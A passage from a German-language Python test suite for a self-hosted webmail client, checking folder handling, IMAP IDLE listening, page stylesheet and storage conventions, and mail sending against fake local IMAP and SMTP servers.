probe("und die REGEL, die auf ihn zeigte, faellt mit",
      "anna@erfunden.example" not in (karte.get("absender") or {}),
      ", ".join(sorted(karte.get("absender") or {})))
# 🔴 This is the reason: a rule naming a folder that is gone makes the filing
#    FAIL — every five minutes again, and nobody sees it but the log.
probe("eine Regel auf einen Ordner, den es noch gibt, bleibt",
      "bea@erfunden.example" in (karte.get("absender") or {}))
probe("die Namensbruecke verliert ihn ebenfalls",
      "synology" not in (karte.get("namen") or {}))

# Deleted by the client itself — with the number in the question.
frage = K.ordner_loeschen({"pf": "zug", "ordner": "INBOX.Steuer"})
probe("ein leerer Ordner wird ohne Rueckfrage geloescht", frage.get("ok") is True,
      frage.get("text"))
karte = K.W.load("ablage.json", {})
probe("und die Wache vergisst ihn in derselben Bewegung",
      "INBOX.Steuer" not in (karte.get("ordner") or {}))
K.ordner_neu({"pf": "zug", "name": "Steuer"})
K.ordner_neu({"pf": "zug", "name": "Steuer/Belege"})
eltern = K.ordner_loeschen({"pf": "zug", "ordner": "INBOX.Steuer"})
probe("ein Ordner mit Unterordnern wird nicht geloescht",
      eltern["ok"] is False and eltern.get("kinder") == 1, eltern.get("text", "")[:50])
K.ordner_loeschen({"pf": "zug", "ordner": "INBOX.Steuer.Belege"})
K.ordner_loeschen({"pf": "zug", "ordner": "INBOX.Steuer"})
fest = K.ordner_loeschen({"pf": "zug", "ordner": "INBOX.Gesendet"})
probe("ein Sonderordner wird nicht geloescht", fest["ok"] is False)
# 🔴 An empty LIST is a failed request, NOT an empty mailbox — otherwise one
#    hiccup at the provider would wipe the whole learned map.
vorher = dict(K.W.load("ablage.json", {}).get("ordner") or {})
K.W.ordner_abgleichen([])
probe("eine leere Ordnerliste loescht NICHTS",
      dict(K.W.load("ablage.json", {}).get("ordner") or {}) == vorher,
      "%d Ordner unveraendert" % len(vorher))

K.W.pf_waehlen("")
K.W.pf_waehlen("")
K.W.save("postfaecher.json", {"liste": [{
    "id": "probe", "name": "Probe", "adresse": "inhaber@erfunden.example",
    "passwort": "geheim", "server": "127.0.0.1", "port": server.port, "an": True}]},
    0o600)
K._VERBINDUNGEN.clear()


# ══ 5c. The listening post: hearing instead of asking ═════════════════════
print("\n── 5c. Der Horchposten ──")
server4 = FalscherIMAP(faehig=("IDLE",))
server4.start()
_zugang_alt = K._zugang
K._zugang = lambda pf: ({"id": "horch", "adresse": "inhaber@erfunden.example",
                         "passwort": "geheim", "server": "127.0.0.1",
                         "port": server4.port}
                        if pf == "horch" else _zugang_alt(pf))

a1 = K.horch({"pf": "horch", "ordner": ["INBOX"], "stand": 0, "warte": 4})
probe("der erste Anruf bringt den Stand mit", a1["ok"] and a1["stand"] >= 1,
      "Stand %s" % a1.get("stand"))
probe("er nennt die drei Zahlen des Ordners",
      a1["marken"].get("INBOX") == [3, 1, 104], str(a1.get("marken")))
probe("er benutzt IDLE, wenn der Server es anbietet", a1["horcht"] is True)
# 🔴 THE point about the connection: an IDLE sits on it for minutes. On the warm
# connection it would sit on the lock that every click goes through.
probe("der Horchposten geht NICHT über die warme Verbindung",
      "horch" not in K._VERBINDUNGEN, str(sorted(K._VERBINDUNGEN)))
probe("er öffnet den Ordner nur zum ANSEHEN (EXAMINE, kein SELECT)",
      any(" EXAMINE " in b for b in server4.befehle)
      and not any(" SELECT " in b for b in server4.befehle),
      "; ".join(b.split(" ", 1)[1][:24] for b in server4.befehle[:6]))

t0 = time.time()
a2 = K.horch({"pf": "horch", "ordner": ["INBOX"], "stand": a1["stand"], "warte": 2})
gewartet = time.time() - t0
probe("ohne Ereignis wartet die Anfrage ihre Zeit ab und meldet denselben Stand",
      gewartet >= 1.8 and a2["stand"] == a1["stand"], "%.1f s" % gewartet)
probe("der Server steht wirklich in IDLE", server4.idle_an.wait(5))

# 🔑 The measurement this whole thing exists for: mail arrives, and the waiting
# request comes back — without anybody asking again.
server4.zahlen.update({"MESSAGES": 4, "UNSEEN": 2, "UIDNEXT": 105})
ergebnis = {}
warter = threading.Thread(
    target=lambda: ergebnis.update(a=K.horch({"pf": "horch", "ordner": ["INBOX"],
                                              "stand": a2["stand"], "warte": 10})),
    daemon=True)
warter.start()
time.sleep(0.4)
t0 = time.time()
geklopft = server4.klopfen("* 4 EXISTS")
warter.join(9)
dauer = time.time() - t0
a3 = ergebnis.get("a") or {}
probe("der falsche Server konnte unaufgefordert sprechen", geklopft)
probe("neue Post weckt die wartende Anfrage in unter zwei Sekunden",
      bool(a3) and a3.get("stand", 0) > a2["stand"] and dauer < 2.0, "%.2f s" % dauer)
probe("die neuen Zahlen stehen in der Antwort",
      a3.get("marken", {}).get("INBOX") == [4, 2, 105], str(a3.get("marken")))
probe("UIDNEXT ist gewachsen — daran erkennt die Seite ANGEKOMMENE Post",
      a3["marken"]["INBOX"][2] > a1["marken"]["INBOX"][2])
probe("der Horchposten ruft nichts ab und setzt keine Flagge",
      not any("FETCH" in b or "STORE" in b for b in server4.befehle),
      "; ".join(b for b in server4.befehle if "FETCH" in b or "STORE" in b))
probe("jedes IDLE wird mit DONE wieder beendet",
      server4.befehle.count("DONE") >= 1
      and sum(1 for b in server4.befehle if b.endswith(" IDLE")) >= 1,
      "%d× IDLE, %d× DONE" % (sum(1 for b in server4.befehle if b.endswith(" IDLE")),
                              server4.befehle.count("DONE")))
# 🔴 And it has to LET GO: a tab closed at night must not hold a connection at the
# provider until morning. Nobody asks any more -> the post closes.
_frist_alt = K.HORCH_FRIST
K.HORCH_FRIST = 1.0
ende = time.time() + 20
posten = K._HORCH["horch"]
while posten["faden"] is not None and time.time() < ende:
    time.sleep(0.2)
probe("ohne Zuhörer schließt der Horchposten von selbst",
      posten["faden"] is None, "nach %.1f s" % (20 - (ende - time.time())))
K.HORCH_FRIST = _frist_alt

# A server WITHOUT IDLE is not a reason to give up — it gets asked instead.
server5 = FalscherIMAP(faehig=())
server5.start()
K._zugang = lambda pf: ({"id": "still", "adresse": "inhaber@erfunden.example",
                         "passwort": "geheim", "server": "127.0.0.1",
                         "port": server5.port}
                        if pf == "still" else _zugang_alt(pf))
b1 = K.horch({"pf": "still", "ordner": ["INBOX"], "stand": 0, "warte": 4})
probe("ohne IDLE meldet der Posten das ehrlich", b1["ok"] and b1["horcht"] is False)
probe("und er fragt trotzdem — der Stand kommt an",
      b1["marken"].get("INBOX") == [3, 1, 104], str(b1.get("marken")))
probe("ohne IDLE wird kein IDLE geschickt",
      not any(b.endswith(" IDLE") for b in server5.befehle))
K.horch_halt()
K._zugang = _zugang_alt


# ══ 6. Sending — against a fake SMTP server ═══════════════════════════════
# ══ 5b. What the pages promise in their own stylesheet ════════════════════
print("\n── 5b. Die Seiten ──")
import os as _os
_HIER = _os.path.dirname(_os.path.abspath(__file__))
for _datei in ("post_klient.html", "post_mobil.html", "post_web.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    # 🔴 The browser's own `[hidden]{display:none}` is ONE selector and loses to
    # every class with a `display`. The swipe hint carried `hidden`, remembered
    # being dismissed and stood there anyway. This line is the whole fix, so it
    # is the thing worth guarding.
    probe("%s setzt [hidden] durch" % _datei,
          "[hidden]{display:none!important}" in _text)
_mobil = io.open(_os.path.join(_HIER, "post_mobil.html"), encoding="utf-8").read()
for _stueck, _was in (("wahlSchluessel", "Auswahl kennt Ordner UND Nummer"),
                      ("nachOrdnern", "Aktionen gehen je Ordner hinaus"),
                      ('id="wahlfuss"', "das Telefon hat eine Auswahlleiste"),
                      ('id="b_ziel"', "und ein Blatt zum Verschieben")):
    probe("Handy: %s" % _was, _stueck in _mobil)
probe("Handy: kein Zahlen-Prompt mehr zum Verschieben",
      "verschieben_frage" not in _mobil)
_breit = io.open(_os.path.join(_HIER, "post_klient.html"), encoding="utf-8").read()
probe("breite Fassung: Auswahl kennt Ordner UND Nummer",
      "wahlSchluessel" in _breit and "S.gewaehlt.add(wahlSchluessel" in _breit)

# 🔴 THE probe this release earned. `const ANSICHTEN` for the day/night button
# collided with the `ANSICHTEN` of the TABS on the watchman page — a duplicate
# `const` is a PARSE error, and a parse error kills the WHOLE script while the
# page still draws its markup and looks perfectly normal in a screenshot. Two
# names, one page: that is findable without a browser.
for _datei in ("post_klient.html", "post_mobil.html", "post_web.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    _namen = re.findall(r"(?m)^(?:const|let|var|function)\s+([A-Za-z_$][\w$]*)", _text)
    _doppelt = sorted({n for n in _namen if _namen.count(n) > 1})
    probe("%s: kein Name zweimal erklaert" % _datei, not _doppelt,
          ", ".join(_doppelt[:4]) if _doppelt else "%d Namen" % len(set(_namen)))

# 🔴 And the probe THIS release earned, the same lesson one storey down: the
# day/night switch kept its choice in `localStorage["pw_ansicht"]` — and so did
# the watchman page for its open TAB, while a COOKIE of that very name carries
# the third meaning (wide page or phone page). Two meanings in one slot wipe each
# other: opening the watchman page wrote „uebersicht" over the light choice, and
# the light button wrote „hell" over the remembered tab. Der Besitzer, 28.09.2026: „in
# der mobilen ansicht geht der tag nacht umschalter nicht" — the switch worked
# every time it was pressed; its MEMORY was taken from underneath it. A duplicate
# `const` at least kills the script loudly; a shared slot fails in silence.
#
# So the slots are declared here, with their purpose, and nothing else may exist.
# A fourth meaning for an old name trips this probe instead of a reader.
_FAECHER = {
    "pw_licht":      ("die Tag/Nacht-Wahl",
                      ("post_klient.html", "post_mobil.html", "post_web.html")),
    "pw_reiter":     ("der offene Reiter der Wache", ("post_web.html",)),
    "pw_ordnerzieh": ("der Hinweis „Ordner ziehen“ wurde gesehen", ("post_mobil.html",)),
    "pw_wisch":      ("der Hinweis „wischen“ wurde gesehen", ("post_mobil.html",)),
}
_gefunden = {}
for _datei in ("post_klient.html", "post_mobil.html", "post_web.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    for _k in re.findall(r'localStorage\.(?:get|set)Item\(\s*"([^"]+)"', _text):
        _gefunden.setdefault(_k, set()).add(_datei)
_fremd = sorted(set(_gefunden) - set(_FAECHER))
probe("kein unangemeldetes Speicherfach", not _fremd,
      ", ".join(_fremd) if _fremd else "%d Faecher, alle erklaert" % len(_gefunden))
for _k, (_zweck, _wo) in _FAECHER.items():
    probe("Fach %s ist nur „%s“" % (_k, _zweck),
          _gefunden.get(_k, set()) == set(_wo),
          ", ".join(sorted(_gefunden.get(_k, set()))))
# 🔴 The COOKIE is still called pw_ansicht — there the word is honest (wide page
#    or phone page), it lives in a different store and the server writes it. But
#    no page may use that name for a slot of its own any more.
probe("pw_ansicht ist KEIN Speicherfach mehr", "pw_ansicht" not in _gefunden,
      ", ".join(sorted(_gefunden.get("pw_ansicht", set()))) or "nur noch der Keks")
# 🔑 And the rule that would have caught the half-finished rename: the parameter
#    in the address and the slot in the store say the SAME word. Rename one and
#    you can no longer forget the other — which is exactly what happened.
for _datei in ("post_klient.html", "post_mobil.html", "post_web.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    _par = re.search(r'\.get\("([a-z]+)"\)[^\n]*\|\| ""', _text)
    probe("%s: Adresse ?%s= und Fach pw_%s heissen gleich"
          % (_datei, _par.group(1) if _par else "?", _par.group(1) if _par else "?"),
          bool(_par) and ('localStorage.getItem("pw_%s")' % _par.group(1)) in _text,
          _par.group(1) if _par else "kein Parameter gefunden")

# ── The day mode ──────────────────────────────────────────────────────────
for _datei in ("post_klient.html", "post_mobil.html", "post_web.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    probe("%s hat einen Tagmodus" % _datei, "html[data-hell]{" in _text)
    # 🔴 The colours have to be set in the HEAD, before the first pixel —
    # anywhere later and the reader sees the night flash past.
    _kopf = _text.split("</head>", 1)[0]
    probe("%s entscheidet die Farben im Kopf" % _datei,
          'setAttribute("data-hell"' in _kopf)
    # 🔴 der Besitzer, 28.09.2026: „standart soll immer nachtmodus sein." So the page
    # asks the DEVICE nothing: a screen set to light must not hand a light page
    # to somebody who never chose one. Only an explicit „hell" turns it on.
    probe("%s fragt das Geraet nicht nach der Tageszeit" % _datei,
          "prefers-color-scheme" not in _text)
    probe("%s kennt nur zwei Stellungen" % _datei,
          'const LICHT_WAHLEN = ["dunkel", "hell"];' in _text)
    # 🔴 An animation nobody can switch off is an animation somebody has to look
    # away from. Whoever asked their system for less motion gets none.
    probe("%s achtet auf prefers-reduced-motion" % _datei,
          "prefers-reduced-motion" in _text)

    # 🔴 And no colour may have its ONLY home in the light block: a token that is
    # missing from `:root` is a colour that does not exist at night.
    _wurzel = set(re.findall(r"(--[a-z0-9-]+)\s*:", _text.split(":root{", 1)[1]
                             .split("}", 1)[0]))
    _hell = set(re.findall(r"(--[a-z0-9-]+)\s*:",
                           _text.split("html[data-hell]{", 1)[1].split("}", 1)[0]))
    probe("%s: jede helle Marke hat ein dunkles Gegenstueck" % _datei,
          not (_hell - _wurzel), ", ".join(sorted(_hell - _wurzel)[:4]))

for _datei in ("post_klient.html", "post_mobil.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    # Folding, and one button for the whole tree — on BOTH surfaces. A tree with
    # twenty branches is not easier to read on a phone, it is harder.
    probe("%s kann falten" % _datei, "function faltenUm(" in _text
          and "S.zu.has(o.name)" in _text)
    probe("%s faltet auch alles auf einmal" % _datei, "function alleFalten(" in _text)
    # 🔴 Roles are not a hierarchy: on most servers they are all called
    # `INBOX.something`, so the inbox looks like the parent of every one of them.
    # Give it a triangle and one tap folds Sent, Drafts, Trash and Junk out of
    # sight. The lesson of 5.2.0 — and it came back on the phone in 5.4.1.
    probe("%s faltet im Rollenblock nichts" % _datei,
          "zeile(o, 0, false)" in _text)
    # 🔴 Moving a folder is ONE command, but the server may be carrying two
    # thousand mails while it runs. A page that says nothing until it is over
    # looks broken — so the message STAYS while it runs.
    probe("%s sagt Bescheid, solange es dauert" % _datei,
          "function melde(text, gut, bleibt)" in _text and 'k.ordner_zieht' in _text)
    probe("%s kann einen Ordner loeschen" % _datei, "klient_ordner_loeschen" in _text)
    probe("%s laesst Ordner mit Ungelesenem atmen" % _datei, '"atmet"' in _text)

_breit2 = io.open(_os.path.join(_HIER, "post_klient.html"), encoding="utf-8").read()
# 🔴 `dragover` only fires while the pointer MOVES. Held still at the top edge —
# which is exactly what somebody does who waits for the list to come to them —
# a scroll step per event would stop dead. So it has to be a timer.
probe("breite Fassung: die Ordnerspalte rollt beim Ziehen mit",
      "function ziehRollen(" in _breit2 and "setInterval" in _breit2.split(
          "function ziehRollen(")[1][:900])

# ── The listening post, as the pages use it ───────────────────────────────
for _datei in ("post_klient.html", "post_mobil.html"):
    _text = io.open(_os.path.join(_HIER, _datei), encoding="utf-8").read()
    probe("%s horcht, statt im Minutentakt zu fragen" % _datei,
          "klient_horch" in _text and "60000)" not in _text)
    # 🔴 Rows taken out by hand are the instant answer; the page is REFILLED from
    # the server. Without it, deleting 50 of 100 left page „1 of 2" empty.
    probe("%s fuellt die Liste nach einer Tat wieder auf" % _datei,
          ("await ladeListe(false);" in _text if "klient.html" in _datei
           else "await listeNachfuellen();" in _text))

print("\n── 6. Der Postausgang ──")


class FalscherSMTP(threading.Thread):
    """Answers like a mail server and throws everything away.

    🔴 Why not simply send one real mail to prove it? Because on a running system
    a test must not act outwards. A single real mail cannot be taken back — and it
    would prove nothing this does not."""

    def __init__(self):
        super().__init__(daemon=True)
        self.dose = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.dose.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.dose.bind(("127.0.0.1", 0))
        self.dose.listen(4)
        self.port = self.dose.getsockname()[1]
        self.befehle, self.briefe, self.empfaenger = [], [], []
        self.laeuft = True

    def run(self):
        while self.laeuft:
            try:
                v, _ = self.dose.accept()
            except OSError:
                return
            threading.Thread(target=self._bedienen, args=(v,), daemon=True).start()

    def _bedienen(self, v):
        datei = v.makefile("rwb")

        def raus(s):
            datei.write(s.encode())
            datei.flush()
        raus("220 erfunden bereit\r\n")
        while True:
            zeile = datei.readline()
            if not zeile:
                return
            roh = zeile.decode("utf-8", "replace").strip()
            self.befehle.append(roh)
            oben = roh.upper()
            if oben.startswith("EHLO") or oben.startswith("HELO"):
                raus("250-erfunden\r\n250-AUTH PLAIN LOGIN\r\n250 SIZE 35882577\r\n")
            elif oben.startswith("AUTH"):
                raus("235 angenommen\r\n")
            elif oben.startswith("MAIL FROM"):
                raus("250 ok\r\n")
            elif oben.startswith("RCPT TO"):
                self.empfaenger.append(roh)
                raus("250 ok\r\n")
            elif oben == "DATA":
                raus("354 los\r\n")
                puffer = b""
                while True:
                    z = datei.readline()
                    if not z or z.strip() == b".":
                        break
                    puffer += z
                self.briefe.append(puffer)
                raus("250 angenommen\r\n")
            elif oben == "QUIT":
                raus("221 tschuess\r\n")
                return
            elif oben == "RSET":
                raus("250 ok\r\n")
            else:
                raus("500 unbekannt\r\n")

    def halt(self):
        self.laeuft = False
        try:
            self.dose.close()
        except OSError:
            pass


post = FalscherSMTP()
post.start()
K.smtp_speichern({"pf": "probe", "server": "127.0.0.1", "port": post.port,
                  "art": "klar", "benutzer": "inhaber@erfunden.example",
                  "passwort": "geheim", "absender_name": "der Besitzer Erfunden"})
kurz = K._smtp_kurz("probe")
probe("der Postausgang ist gespeichert", kurz["server"] == "127.0.0.1"
      and kurz["passwort_da"] is True)
probe("das Passwort des Postausgangs wird NICHT herausgegeben",
      "passwort" not in kurz and "geheim" not in json.dumps(kurz))
# 🔴 The regression that the bench found: `postfaecher()` REBUILDS a mailbox out
# of a fixed set of fields. The outgoing server was stored and then silently
# dropped on every read — the file was right, the answer was old.
probe("der gespeicherte Postausgang ueberlebt das Lesen des Postfachs",
      K.smtp_zugang("probe")["port"] == post.port,
      "%s statt %s" % (K.smtp_zugang("probe")["port"], post.port))
PW.postfach_speichern({"id": "probe", "name": "Probe, umbenannt"})
probe("und er ueberlebt das Bearbeiten des Postfachs auf der Waechterseite",
      K.smtp_zugang("probe")["port"] == post.port
      and K.smtp_zugang("probe")["absender_name"] == "der Besitzer Erfunden",
      str(K._smtp_kurz("probe")))
probe("die Pruefung erreicht den Server", K.smtp_pruefen({"pf": "probe"})["ok"])
probe("die Pruefung sendet NICHTS", not post.briefe and "DATA" not in post.befehle,
      "%d Briefe" % len(post.briefe))

server.befehle.clear()
erg = K.senden({"pf": "probe", "an": "Anna Beispiel <anna@erfunden.example>",
                "kopie": "zweiter@erfunden.example",
                "blind": "heimlich@erfunden.example",
                "betreff": "Rückfrage zum Termin",
                "text": "Hallo Anna,\nDonnerstag passt.\n",
                "quelle": {"ordner": "INBOX", "uid": 101},
                "in_antwort_auf": "<eins@erfunden.example>"})
probe("gesendet", erg["ok"], erg.get("text"))
brief = (post.briefe[-1] if post.briefe else b"").decode("utf-8", "replace")
probe("der Absender traegt den eingestellten Namen",
      "der Besitzer Erfunden" in brief and "inhaber@erfunden.example" in brief)
probe("der Betreff kommt mit Umlaut an (kodiert)",
      "Subject:" in brief and ("=?utf-8?" in brief.lower() or "Rückfrage" in brief))
probe("die Mail hat eine Message-Id", re.search(r"(?mi)^Message-Id:\s*<[^>]+@", brief) is not None)
probe("die Antwortbeziehung steht drin", "In-Reply-To: <eins@erfunden.example>" in brief)
probe("das Programm nennt sich selbst", "X-Mailer: Postwache" in brief)
probe("alle drei Empfaenger bekommen sie",
      sum(1 for e in post.empfaenger if "anna@" in e or "zweiter@" in e
          or "heimlich@" in e) == 3, str(len(post.empfaenger)))
# 🔴 A blind copy stays blind: the recipient is addressed, the header is not sent.
probe("die Blindkopie steht NICHT in der gesendeten Mail",
      "heimlich@erfunden.example" not in brief)
probe("in der Ablage steht sie aber",
      any(b"heimlich@erfunden.example" in a for a in server.angehaengt))
probe("die Kopie landet im Gesendet-Ordner",
      any("APPEND" in b and "Gesendet" in b for b in server.befehle))
probe("die beantwortete Mail wird als beantwortet markiert",
      any("Answered" in b for b in server.befehle))
chronik = os.path.join(TMP, "out", "chronik.jsonl")   # the history lives in out/
inhalt = io.open(chronik, encoding="utf-8").read() if os.path.exists(chronik) else ""
probe("die Chronik merkt sich WER, nicht WAS",
      "Donnerstag passt" not in inhalt and "klient_gesendet" in inhalt)

erg = K.senden({"pf": "probe", "an": "", "betreff": "x", "text": "y"})
probe("ohne Empfaenger geht nichts hinaus", not erg["ok"])
vorher = len(post.briefe)
erg = K.senden({"pf": "probe", "an": "anna@erfunden.example", "betreff": "gross",
                "text": "x", "anhaenge": [{"name": "zu_gross.bin", "typ": "",
                                           "b64": base64.b64encode(b"x" * 400).decode()}]})
K.einstellung_setzen({"anhang_grenze": 1})
erg = K.senden({"pf": "probe", "an": "anna@erfunden.example", "betreff": "gross",
                "text": "x", "anhaenge": [{"name": "zu_gross.bin", "typ": "",
                                           "b64": base64.b64encode(b"x" * 2_000_000).decode()}]})
probe("ein zu grosser Anhang wird VOR dem Verbinden abgelehnt",
      not erg["ok"] and len(post.briefe) == vorher + 1, erg.get("text", "")[:50])
K.einstellung_setzen({"anhang_grenze": 25})
erg = K.senden({"pf": "probe", "an": "anna@erfunden.example", "betreff": "mit Anhang",
                "text": "siehe Anhang",
                "anhaenge": [{"name": "notiz.txt", "typ": "text/plain",
                              "b64": base64.b64encode("Grüße".encode()).decode()}]})
brief = post.briefe[-1].decode("utf-8", "replace")
probe("ein Anhang geht mit", erg["ok"] and "notiz.txt" in brief)
entwurf = K.entwurf_speichern({"pf": "probe", "an": "anna@erfunden.example",
                               "betreff": "halbfertig", "text": "..."})
probe("ein Entwurf wird im Entwurfsordner abgelegt", entwurf["ok"],
      entwurf.get("text"))
probe("der Entwurf traegt die Entwurfs-Flagge",
      any("APPEND" in b and "Draft" in b for b in server.befehle))

K.verbindungen_schliessen()
for s_ in (server, server2, server3, server4, server5, server6):
    s_.halt()
post.halt()
seite.terminate()
try:
    seite.wait(timeout=5)
except Exception:
    seite.kill()
shutil.rmtree(TMP, ignore_errors=True)

print("\n%s  %d Proben, %d Fehlschlaege"
      % ("ALLES GRUEN" if not fehler else "ROT", proben, len(fehler)))
if fehler:
    for f in fehler:
        print("   ✗ " + f)
sys.exit(1 if fehler else 0)
